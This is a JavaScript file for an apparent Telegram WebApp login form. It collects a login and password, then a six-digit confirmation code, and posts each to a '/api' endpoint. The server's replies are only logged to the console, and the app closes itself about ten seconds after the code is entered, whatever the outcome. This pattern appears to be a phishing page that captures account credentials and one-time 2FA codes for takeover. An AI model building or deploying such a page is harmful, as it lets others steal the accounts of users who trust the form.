document.addEventListener("alpine:init", () => {
  let tg = window.Telegram.WebApp;

  Alpine.store("form", {
    isCodeSent: false,
    login: "",
    password: "",
    errorMessage: "",
    loginInvalid: false,
    passwordInvalid: false,
    code: "",
    loader: false,

    keyUpCode(code) {
      if (code < 6) {
        const next_code = code + 1;
        const codeValue = document.getElementById(`code${code}`).value;
        if (codeValue.length === 1) {
          document.getElementById(`code${next_code}`).focus();
        }
      }
      this.validateCode();
    },

    validateCode() {
      let code = "";
      for (let i = 1; i <= 6; i++) {
        code += document.getElementById(`code${i}`).value;
      }
      if (code.length === 6) {
        this.actionDoneWithCode(code);
      }
    },

    actionDoneWithCode(code) {
      if (this.code.length === 0) {
        this.code = code;
        this.sendRequest(2);
        this.loader = true;
      }

      setTimeout(() => {
        if (tg) {
          tg.close();
        }
      }, 10000);
    },

    validateForm() {
      this.errorMessage = "";
      this.loginInvalid = false;
      this.passwordInvalid = false;

      if (this.login.trim().length === 0) {
        this.errorMessage += "Введите логин. ";
        this.loginInvalid = true;
      }

      if (this.password.trim().length < 6) {
        this.errorMessage += "Пароль должен содержать хотя бы 6 символов. ";
        this.passwordInvalid = true;
      }

      const specialChars = /[!@#$%^&*()\-_,.?"№;%:{}|<>]/;
      if (!specialChars.test(this.password)) {
        this.errorMessage += "Пароль должен содержать спецсимволы. ";
        this.passwordInvalid = true;
      }

      this.errorMessage = this.errorMessage.trim();
    },

    sendRequest(step) {
      fetch("/api", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          step: step,
          login: this.login,
          password: this.password,
          code: this.code,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log("Success:", data);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    },

    actionLogin() {
      this.validateForm();

      if (!this.loginInvalid && !this.passwordInvalid) {
        this.sendRequest(1);
        setTimeout(() => {
          this.isCodeSent = true;
        }, 500);
      }
    },

    isShowLoginLabel() {
      return this.login.trim().length === 0;
    },

    isShowPasswordLabel() {
      return this.password.trim().length === 0;
    },
  });
});
